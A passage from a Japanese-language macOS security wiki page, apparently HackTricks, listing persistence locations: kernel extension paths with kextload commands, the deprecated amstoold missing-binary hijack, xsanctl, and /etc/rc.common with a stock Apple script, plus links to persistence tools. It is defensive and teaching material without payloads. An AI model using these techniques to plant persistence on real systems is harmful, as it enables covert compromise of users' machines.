KEXT を startup item としてインストールするには、**以下のいずれかの場所にインストールする必要があります**。

- `/System/Library/Extensions`
- OS X operating system に組み込まれた KEXT ファイル
- `/Library/Extensions`
- 3rd party software によってインストールされた KEXT ファイル

現在ロードされている kext ファイルは、次のコマンドで一覧表示できます。
```bash
kextstat #List loaded kext
kextload /path/to/kext.kext #Load a new one based on path
kextload -b com.apple.driver.ExampleBundle #Load a new one based on path
kextunload /path/to/kext.kext
kextunload -b com.apple.driver.ExampleBundle
```
詳細については、[**kernel extensionsについてはこのセクションを確認してください**](macos-security-and-privilege-escalation/mac-os-architecture/index.html#i-o-kit-drivers)。

### ~~amstoold~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0029/](https://theevilbit.github.io/beyond/beyond_0029/)

#### Location

- **`/usr/local/bin/amstoold`**
- Rootが必要

#### Description & Exploitation

どうやら、`/System/Library/LaunchAgents/com.apple.amstoold.plist` の `plist` は XPC serviceを公開しながら、このバイナリを使用していたようです……問題は、そのバイナリが存在しなかったことです。そのため、そこに何かを配置しておけば、XPC serviceが呼び出されたときに、そのバイナリも呼び出されます。<sup>[[35]](#references)</sup>

現在のmacOSでは、もうこれを見つけることはできません。

### ~~xsanctl~~

Writeup: [https://theevilbit.github.io/beyond/beyond_0015/](https://theevilbit.github.io/beyond/beyond_0015/)

#### Location

- **`/Library/Preferences/Xsan/.xsanrc`**
- Rootが必要
- **Trigger**: serviceが実行されたとき（まれ）

#### Description & exploit

どうやらこのscriptが実行されることはあまり一般的ではなく、私のmacOSでも見つけることができませんでした。そのため、詳しい情報が必要な場合はwriteupを確認してください。<sup>[[36]](#references)</sup>

### ~~/etc/rc.common~~

> [!CAUTION] > **これは最新のMacOSバージョンでは機能しません**

ここに**startup時に実行されるcommands**を配置することも可能です。通常のrc.common scriptの例：
```bash
#
# Common setup for startup scripts.
#
# Copyright 1998-2002 Apple Computer, Inc.
#

######################
# Configure the shell #
######################

#
# Be strict
#
#set -e
set -u

#
# Set command search path
#
PATH=/bin:/sbin:/usr/bin:/usr/sbin:/usr/libexec:/System/Library/CoreServices; export PATH

#
# Set the terminal mode
#
#if [ -x /usr/bin/tset ] && [ -f /usr/share/misc/termcap ]; then
#    TERM=$(tset - -Q); export TERM
#fi

###################
# Useful functions #
###################

#
# Determine if the network is up by looking for any non-loopback
# internet network interfaces.
#
CheckForNetwork()
{
local test

if [ -z "${NETWORKUP:=}" ]; then
test=$(ifconfig -a inet 2>/dev/null | sed -n -e '/127.0.0.1/d' -e '/0.0.0.0/d' -e '/inet/p' | wc -l)
if [ "${test}" -gt 0 ]; then
NETWORKUP="-YES-"
else
NETWORKUP="-NO-"
fi
fi
}

alias ConsoleMessage=echo

#
# Process management
#
GetPID ()
{
local program="$1"
local pidfile="${PIDFILE:=/var/run/${program}.pid}"
local     pid=""

if [ -f "${pidfile}" ]; then
pid=$(head -1 "${pidfile}")
if ! kill -0 "${pid}" 2> /dev/null; then
echo "Bad pid file $pidfile; deleting."
pid=""
rm -f "${pidfile}"
fi
fi

if [ -n "${pid}" ]; then
echo "${pid}"
return 0
else
return 1
fi
}

#
# Generic action handler
#
RunService ()
{
case $1 in
start  ) StartService   ;;
stop   ) StopService    ;;
restart) RestartService ;;
*      ) echo "$0: unknown argument: $1";;
esac
}
```
## Persistenceの手法とツール

- [https://github.com/cedowens/Persistent-Swift](https://github.com/cedowens/Persistent-Swift)
- [https://github.com/D00MFist/PersistentJXA](https://github.com/D00MFist/PersistentJXA)

## 参考資料

- [1] [2025年、Infostealerの年](https://www.pentestpartners.com/security-blog/2025-the-year-of-the-infostealer/)
- [2] [Beyond the good ol' LaunchAgents - 1 - shell startup files](https://theevilbit.github.io/beyond/beyond_0001/)
- [3] [Beyond the good ol' LaunchAgents - 18 - X11 and XQuartz](https://theevilbit.github.io/beyond/beyond_0018/)
- [4] [Beyond the good ol' LaunchAgents - 21 - Re-opened Applications](https://theevilbit.github.io/beyond/beyond_0021/)
- [5] [Beyond the good ol' LaunchAgents - 20 - Terminal Preferences](https://theevilbit.github.io/beyond/beyond_0020/)
- [6] [Beyond the good ol' LaunchAgents - 13 - Audio Plugins](https://theevilbit.github.io/beyond/beyond_0013/)
- [7] [Audio Unit Plug-ins (SpecterOps)](https://posts.specterops.io/audio-unit-plug-ins-896d3434a882)
- [8] [Beyond the good ol' LaunchAgents - 12 - QuickLook Plugins](https://theevilbit.github.io/beyond/beyond_0012/)
- [9] [Beyond the good ol' LaunchAgents - 22 - LoginHook and LogoutHook](https://theevilbit.github.io/beyond/beyond_0022/)
- [10] [Beyond the good ol' LaunchAgents - 4 - cron jobs](https://theevilbit.github.io/beyond/beyond_0004/)
- [11] [Beyond the good ol' LaunchAgents - 2 - iTerm2 startup](https://theevilbit.github.io/beyond/beyond_0002/)
- [12] [Beyond the good ol' LaunchAgents - 7 - xbar plugins](https://theevilbit.github.io/beyond/beyond_0007/)
- [13] [Beyond the good ol' LaunchAgents - 8 - Hammerspoon](https://theevilbit.github.io/beyond/beyond_0008/)
- [14] [Beyond the good ol' LaunchAgents - 6 - SSHRC](https://theevilbit.github.io/beyond/beyond_0006/)
- [15] [Beyond the good ol' LaunchAgents - 3 - Login Items](https://theevilbit.github.io/beyond/beyond_0003/)
- [16] [Beyond the good ol' LaunchAgents - 14 - atrun](https://theevilbit.github.io/beyond/beyond_0014/)
- [17] [Beyond the good ol' LaunchAgents - 24 - Folder Actions](https://theevilbit.github.io/beyond/beyond_0024/)
- [18] [Folder Actions for Persistence on macOS (SpecterOps)](https://posts.specterops.io/folder-actions-for-persistence-on-macos-8923f222343d)
- [19] [Beyond the good ol' LaunchAgents - 27 - Dock shortcuts](https://theevilbit.github.io/beyond/beyond_0027/)
- [20] [Beyond the good ol' LaunchAgents - 17 - Color Pickers](https://theevilbit.github.io/beyond/beyond_0017/)
- [21] [Beyond the good ol' LaunchAgents - 26 - Finder Sync Plugins](https://theevilbit.github.io/beyond/beyond_0026/)
- [22] [Analyzing "Mac File Opener" Persistence (Objective-See)](https://objective-see.org/blog/blog_0x11.html)
- [23] [Beyond the good ol' LaunchAgents - 16 - Screen Saver](https://theevilbit.github.io/beyond/beyond_0016/)
- [24] [Saving Your Access: Screensavers for macOS Persistence (SpecterOps)](https://posts.specterops.io/saving-your-access-d562bf5bf90b)
- [25] [Beyond the good ol' LaunchAgents - 11 - Spotlight Importers](https://theevilbit.github.io/beyond/beyond_0011/)
- [26] [Beyond the good ol' LaunchAgents - 9 - Preference Pane](https://theevilbit.github.io/beyond/beyond_0009/)
- [27] [Beyond the good ol' LaunchAgents - 19 - Periodic Scripts](https://theevilbit.github.io/beyond/beyond_0019/)
- [28] [Beyond the good ol' LaunchAgents - 5 - Pluggable Authentication Modules (PAM)](https://theevilbit.github.io/beyond/beyond_0005/)
- [29] [Beyond the good ol' LaunchAgents - 28 - Authorization Plugins](https://theevilbit.github.io/beyond/beyond_0028/)
- [30] [Persistent Credential Theft with Authorization Plugins (SpecterOps)](https://posts.specterops.io/persistent-credential-theft-with-authorization-plugins-d17b34719d65)
- [31] [Beyond the good ol' LaunchAgents - 30 - The man config file - man.conf](https://theevilbit.github.io/beyond/beyond_0030/)
- [32] [Beyond the good ol' LaunchAgents - 25 - Apache2 modules](https://theevilbit.github.io/beyond/beyond_0025/)
- [33] [Beyond the good ol' LaunchAgents - 31 - BSM audit framework](https://theevilbit.github.io/beyond/beyond_0031/)
- [34] [Beyond the good ol' LaunchAgents - 23 - emond, The Event Monitor Daemon](https://theevilbit.github.io/beyond/beyond_0023/)
- [35] [Beyond the good ol' LaunchAgents - 29 - amstoold](https://theevilbit.github.io/beyond/beyond_0029/)
- [36] [Beyond the good ol' LaunchAgents - 15 - xsanctl](https://theevilbit.github.io/beyond/beyond_0015/)

{{#include ../banners/hacktricks-training.md}}
